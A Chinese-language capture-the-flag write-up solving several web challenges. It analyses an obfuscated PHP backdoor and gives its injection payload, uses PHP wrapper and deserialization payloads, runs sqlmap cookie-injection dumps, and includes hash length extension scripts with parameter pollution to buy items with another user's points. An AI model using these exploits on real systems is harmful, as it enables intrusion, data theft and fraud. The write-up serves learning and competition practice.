# Raccoon Writeup

### PHP 后门分析

李大猫在他的 WordPress 博客里发现了被黑客植入的 PHP 后门，快帮他分析分析这个后门要怎么利用吧

```php
<?php 
	$z0 = $_REQUEST['sort'];
	$q1 = '';
	$c2 = "wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";
	$y3 = array(8,38,15,7,6,4,26,25,7,34,24,25,7);
	foreach($y3 as $h4){
		$q1.=$c2[$h4];  // q1 = base64_decode
	}
	$v5 = strrev("noi"."tcnuf"."_eta"."erc");  // create_function
	$j6 = $v5("",$q1($z0));  // j6 = create_function("",base64_decode(sort))
	$j6();	// j6() 是一个没有参数的匿名函数，
?>
```

create_function() 与 eval()  有同样的危险性，可以注入恶意代码。

```php
function fT($a) {
  echo "test".$a;
}

// 注入 $a = }phpinfo();/* 后：
function fT($a) {
  echo "test";}
  phpinfo();/*
}*/

create_function(args, code)  // The function arguments. The function code.
$j6() => function(args) {
	code
}
```

此题只需将 `}phpinfo();/*` 进行 base64 编码，再传进去就 OK 了

![1541723641637](C:\Users\LegnaVI\AppData\Roaming\Typora\typora-user-images\1541723641637.png)



### 抓包和改包

满足以下全部条件就能获得 flag

-   将 HTTP 请求方式修改为 POST
-   添加 HTTP 请求头“X-Give-Me-Flag”，值为 1
-   将包含浏览器标识的 HTTP 请求头的值修改为“Flag Browser 1.0”
-   将 Cookie 中“auth”的值修改为 117.29.42.247
-   POST 键名为“action”，值为“readflag”的数据

这题比较简单，直接用 Burp 改一下就 OK 了

```shell
POST / HTTP/1.1
Host: http01.web.raccoon.ml:8080
User-Agent: Flag Browser 1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: auth=117.29.42.247
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
X-Give-Me-Flag: 1
Content-Length: 15
Content-Type: application/x-www-form-urlencoded

action=readflag
```



### Javascript Tricks

nc 45.32.250.222 8082

```javascript
var net = require('net');

flag='fake_flag';

var server = net.createServer(
	function(socket) {
		socket.on('data', (data) => { 
			//m = data.toString().replace(/[\n\r]*$/, '');
			ok = true;
			arr = data.toString().split(' ');  // 空格作为分隔，创建数组
			arr = arr.map(Number);	// 全部转为数字
			if (arr.length != 5)    // arr长度为5
				ok = false;
			arr1 = arr.slice(0);    // 抽取从0开始的所有字符(就是复制arr给arr1)
			arr1.sort();  			
			// js sort比较特殊  10,5,40,25,1000,1 -> 1,10,1000,25,40,5
			for (var i=0; i<4; i++)  // 前后元素不能相同
				if (arr1[i+1] == arr1[i] || arr[i] < 0 || arr1[i+1] > 127)
					ok = false;
			arr2 = []
			for (var i=0; i<4; i++)
				arr2.push(arr1[i] + arr1[i+1]);
			val = 0;
			for (var i=0; i<4; i++)
				val = val * 0x100 + arr2[i];  // 0x100 = 256
			if (val != 0x23332333)  // 590553907
				ok = false;
			if (ok)
				socket.write(flag+'\n');
			else
				socket.write('nope\n');
		});
		//socket.write('Echo server\r\n');
		//socket.pipe(socket);
	}
);

HOST = '0.0.0.0'
PORT = 8082

server.listen(PORT, HOST); 
```

初步思路：把 data 暴力跑出来，再 nc 提交一下

```python
def check(a,b,c,d):
    arr = [a,b,c,d]
    val = 0
    for i in range(4):
        val = val * 256 + arr[i]
    if val == 590553907:  # 也可以不转十进制
        return True

N = 60
for i in range(N):
    for j in range(N):
        for k in range(N):
            for l in range(N):
                if check(i,j,k,l):
                    print(i,j,k,l)

# arr2 = [35 51 35 51]

N = 51
for i in range(N):
    for j in range(N):
        for k in range(N):
            for l in range(N):
                for m in range(N):
                    if i+j == 35 and j+k == 52 and k+l == 35 and l+m == 51:
                        print(i,j,k,l,m)
                        
"""
0 35 17 18 33
1 34 18 17 34
2 33 19 16 35
3 32 20 15 36
4 31 21 14 37
5 30 22 13 38
6 29 23 12 39
7 28 24 11 40
8 27 25 10 41
9 26 26 9 42
10 25 27 8 43
11 24 28 7 44
12 23 29 6 45
13 22 30 5 46
14 21 31 4 47
15 20 32 3 48
16 19 33 2 49
17 18 34 1 50
18 17 35 0 51
"""

# 懒得写sort规则了，直接按照 js sort 规则手工挑选一下 
# 可得最终的 data：15 20 32 3 48
```



### The user admin

```shell
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
```

这道题涉及到PHP的代码审计，PHP的伪协议，PHP的序列化，PHP魔术方法，涨了不少姿势，

趁着写 Writeup 把思路再梳理一下。[参考博客1](https://blog.csdn.net/csu_vc/article/details/78375203)  [参考博客2](https://blog.csdn.net/yh1013024906/article/details/81087939) 

乍一看，玄机只可能在 class.php 里面，现在就是寻找满足 if 的这个条件。

```php
file_get_contents(path,include_path,context,start,max_length)
// 把整个文件读入一个字符串中，后四个参数都是可选项
```

问题变为，怎么读取 $user 之后得到 "the user is admin"。

这里涉及到一个 PHP伪协议，`php://input`，可读取没有处理过的 POST 数据。[详细讲解](<https://blog.csdn.net/qq_27682041/article/details/73326435>)  [大佬讲解](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

```shell
http://120.78.187.100:8081/?user=php://input
# 再 post 一个 "the user is admin"
# 此时可以发现界面变成了 "hello admin!"
http://120.78.187.100:8081/?user=php://input&file=class.php
# 然后还是没卵用？？
```

再来了一个 PHP伪协议，`php://filter`，可用来读取base64编码后的源代码。

```shell
?user=php://input&file=php://filter/read=convert.base64-encode/resource=class.php
```

解码之后，得到 class.php 的源代码

```php
<?php
	class Read{//f1a9.php
		public $file;
		public function __toString(){
			if(isset($this->file)){
				echo file_get_contents($this->file);    
			}
			return "__toString was called!";
		}
	}
?>
// 注意到有个 __tostring()，这个方法可以理解为将这个类作为字符串执行时会自动执行的一个函数
```

看一下 index.php 源代码

```php
<?php
    $user = $_GET["user"];
    $file = $_GET["file"];
    $pass = $_GET["pass"];

    if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
        echo "hello admin!<br>";
        if(preg_match("/f1a9/",$file)){  // 直接过滤掉 fla9
            exit();
        }else{
            include($file); //class.php
            $pass = unserialize($pass);  // 反序列化再输出
            echo $pass;
        }
    }else{
        echo "you are not admin ! ";
    }
?>
// unserialize()
```

总结一下思路，flag 就隐藏在 f1a9.php 里面，但是无法直接读取 f1a9.php 内容(被preg_match过滤)，只能通过Read 这个类中 __tostring() 方法，而这个方法再创建对象时就会被调用。能作为输入接口的就只有 pass 了，pass 这里又会反序列化再输出，所以利用 echo $pass; 来创建对象就可以了。

创建序列化对象

```php
<?php
    class Read{
    	public $file;
	}

	$a = new Read();
	$a->file = "f1a9.php";
	$a = serialize($a);
	print_r($a);
?>
// O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
```

最终执行

```shell
http://120.78.187.100:8081/?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}

# 再 post 一个 "the user is admin"
```



### Easy waf

随手扫一下后台，得到了一个 www.zip 的源码包，然后就是代码审计了。

一开始毫无经验，看了好久的源码之后，还是不知从何下手，顺手把 PHP 和 MySQL 学了。

第一想法是 `username` 和 `password` 可以注入，毕竟过滤函数不会对他们进行处理。

```shell
foreach ($_POST as $key => $value) {
    if ($key != "username"&&strstr($key, "password") == false) {
        $_POST[$key] = filtering($value);
    }
}
```

后来发现 `uesr_id` 可以注入，最终在 `login.php` 中找到 `user_id` 的来源，就是数据库中的键。

```php
// index.php
<h2>历史留言</h2>
<?php
    $user_id=$_SESSION['user_id'];
	$sql = "select * from content where user_id=$user_id";
	$arr = select($sql);
?>
    
// login.php
$_SESSION['username'] = $a['username'];  // 在这里
$_SESSION['user_id'] = $a['id'];		 // 手动高亮
```

GET、POST都被直接过滤了，试试 cookie 注入，手工注入不太会，先跑跑 sqlmap 试试。[参考博客](https://blog.csdn.net/u011781521/article/details/58135307)

```shell
# 1.cookie 注入，猜解表
sqlmap -u http://120.78.187.100:8082/content.php --cookie "message_id=1412" --table --level 2
# do you want to URL encode cookie values (implementation specific)? [Y/n] Y
[10:42:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: PHP 5.6.38, Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
Cookie parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
# do you want to use common table existence check? [Y/n/q] Y 10
# 表已经跑出来了
Database: 2018_hdb_waf 
[3 tables]
+---------------------------------------+
| user                                  |
| content                               |
| flag                                  |
+---------------------------------------+

# 2.选择表猜解字段(flag)
sqlmap -u http://120.78.187.100:8082/content.php --cookie "message_id=1412" --column -T flag --level 2
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
+--------+--------------+

# 3.猜解内容
sqlmap -u http://120.78.187.100:8082/content.php --cookie "message_id=1412" --dump -T flag --level 2
[10:44:45] [INFO] retrieved: 1
[10:44:45] [INFO] retrieved: flag{b4d_eregi_d0_noT_uSe_1t}
Database: 2018_hdb_waf
Table: flag
[1 entry]
+-------------------------------+
| flag                          |
+-------------------------------+
| flag{b4d_eregi_d0_noT_uSe_1t} |
+-------------------------------+
# 至此，flag 已经成功获得，第一次成功用sqlmap跑出来还是蛮激动的，哈哈哈，爽~
```

==手注版==(吴乾豪提供)  以后再整理一下

![IQMRDL4](C:\Users\LegnaVI\Documents\Tencent Files\1095184193\FileRecv\IQMRDL4.png)

![STNGU9DPB2](C:\Users\LegnaVI\Documents\Tencent Files\1095184193\FileRecv\STNGU9DPB2.png)

![1542284390673](C:\Users\LegnaVI\AppData\Roaming\Typora\typora-user-images\1542284390673.png)



### 咕咕 shop

听说 [咕咕shop](http://118.89.198.146:50006/) 上有个积分上万的人，你能越权消耗他的积分，购买到 FLAG 吗？

+   哈希长度扩展攻击    [相关工具](https://www.cnblogs.com/pcat/p/5478509.html)  [参考博客](http://www.cnblogs.com/pcat/p/7668989.html)  [Hashpumpy](https://github.com/bwall/HashPump)

+   HTTP参数污染

HTTP参数污染，简单地讲就是给一个参数赋上两个或两个以上的值。现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理。因此web程序组件在遇到这类问题时采取的方法也不完全相同。在一个HTTP请求中，同一个参数，拥有多个值是合法的。利用此特性，可以作为绕过参数过滤的手段。

假设这个URL：http://www.xxxx.com/search.php?id=110&id=911

百度会理解成让百度搜索：110                 #选择了第一个参数,放弃了第二个参数。

雅虎会理解成让雅虎搜索：911　　          #选择了第二个参数,放弃了第一个参数。

谷歌会理解成让谷歌搜索：110 911         #两个参数同时选择。

假设输入 ?key=select & key=1,2,3,4 from table

服务端有可能会将key处理为select 1,2,3,4 from table，从而导致SQL注入。

![1542278011170](C:\Users\LegnaVI\AppData\Roaming\Typora\typora-user-images\1542278011170.png)

战线拉得太长，很多东西都快忘了，赶紧写下wp巩固下

<u>记录下几个关键点：</u>

1.利用哈希长度扩展攻击跑出密钥长度

2.利用 HPP 实现越权“购买”



==shell版==：第一想法是先生成字典，然后放到bp里跑，结果失败了

```shell
#!/bin/bash

signature="422f15413110908ab58d837ae3b2f28f"
data="order_id=156&buyer_id=39&good_id=25&buyer_point=510&good_price=10&order_create_time=1542048947.212575"
key_len=900  # yizhimiyao
#add_data="&good_id=42&buyer_point=999999"
add_data="&a"
#add_data="&good_id=42"
#add_data="&a=2"
mabye="buyer_point=999999"

for ((len=0; i<350; i++,key_len++))
do
	hashpump -s $signature -d $data -k $key_len -a $add_data
done
```

```shell
#!/bin/bash
bash _shell > len.txt
awk 'NR%2==0' len.txt > post.txt  # 输出偶数行
awk 'NR%2==1' len.txt > sign.txt  # 输出奇数行
```



==py版==：还是py给力，以后全用py吧

先post一个无关的值。如果签名没错，即秘钥长度正确，post一个无关的值，仍然会购买成功

```python
import hashpumpy
import urllib
import requests
import json

for i in range(500):
	signature = '579e444c268e0d907802313318cdfcb2'
	original = 'order_id=160&buyer_id=39&good_id=25&buyer_point=500&good_price=10&order_create_time=1542226400.115264'
	add_data = '&a=233'
	key_length = len(original) + 700 + i

	hash = hashpumpy.hashpump(signature,original,add_data,key_length)

	url = 'http://118.89.198.146:50006/paymentGatewayV2/cid-1145141919/810893/check.jsp?signature='
	
	# message = urllib.quote(urllib.unquote(hash[1]))  不需要编码为URL
	message = hash[1]
    print i,hash[0]
        
	url += hash[0]
        print url
	
	headers={
        'Content-Type': 'application/x-www-form-urlencoded',
		'cookie': 'csrftoken=9wFi4GbKQdcis91qJP28DEmZZerQXdqBWt53kHmwUNp1iEFVnEVEVFmYuX5eBKUG; JSESSIONID=buakhmracrlqcyxt726ui8u5jymu0ov4',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding': 'gzip, deflate'
	}

	#res = requests.post(url=url,headers=headers,data=message,proxies={'http': '127.0.0.1:8080'})
	res = requests.post(url=url,headers=headers,data=message)

    if 'alert alert-dange' not in res.content:
       print key_length;
       break
```

![1542281973455](C:\Users\LegnaVI\AppData\Roaming\Typora\typora-user-images\1542281973455.png)

得到长度后，就是参数污染了。直接添加`good_id=42`失败了，否则就太简单了，换了不少姿势。

后面突然想到，题面的信息：有个积分上万的人，你能越权消耗他的积分，购买到 FLAG 吗？

==划重点==  用别人的钱买flag  ==划重点==

然后就是换`buyer_id`，第一反应是 1, 0 ? 不，还是失败了，直接挂个脚本尝试下？31，购买成功！

期间遇到的麻烦：页面找不到。最初以为是自己误删了某个信息，重新复制一下仍然报错，纠结了好久。



```python
import hashpumpy
import urllib
import requests

signature = '7d542ad0766a6459e6048ed854091987'
original = 'order_id=162&buyer_id=39&good_id=33&buyer_point=480&good_price=300&order_create_time=1542231522.790944'
#add_data = '&good_id=42'
#add_data = '&buyer_id=0'
#add_data = '&buyer_id=1&good_id=42'
#add_data = '&good_id=42&good_id=42'
#add_data = '&good_id=42&buyer_point=999'
#add_data = '&good_id=42&buyer_point=999&good_price=998'
#add_data = '&buyer_point=999&good_id=42&good_price=998'
key_length = 1024
headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'cookie': 'csrftoken=9wFi4GbKQdcis91qJP28DEmZZerQXdqBWt53kHmwUNp1iEFVnEVEVFmYuX5eBKUG; JSESSIONID=buakhmracrlqcyxt726ui8u5jymu0ov4',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate'
}

    
i = 31
add_data = '&good_id=42&buyer_id=' + str(i)
# i = 31 who have money to buy flag
hash = hashpumpy.hashpump(signature,original,add_data,key_length)
url = 'http://118.89.198.146:50006/paymentGatewayV2/cid-1145141919/810893/check.jsp?signature=' + hash[0]
# message = urllib.quote(urllib.unquote(hash[1]))
message = hash[1]

# proxy={'http': '127.0.0.1:8080'}  设置代理
# 如果不确定request发的具体数据，用bp看看(剑涛老哥教的)

#res = requests.post(url=url,headers=headers,data=message,proxies=proxy)
res = requests.post(url=url,headers=headers,data=message)

print res.content
if 'alert alert-success' in res.content:
    print "-------------------------Success!------------------------"
```

![1542281916199](C:\Users\LegnaVI\AppData\Roaming\Typora\typora-user-images\1542281916199.png)

到此，flag 已经买到了。当时候还没反应过来，想着再买一次，去看一下订单，flag已经出来。 



**Raccoon 的纳新题就全做完了，也顺利进入了ROIS的考核队列。**

**小目标成功实现，也对得起这几天疯狂做web题了。**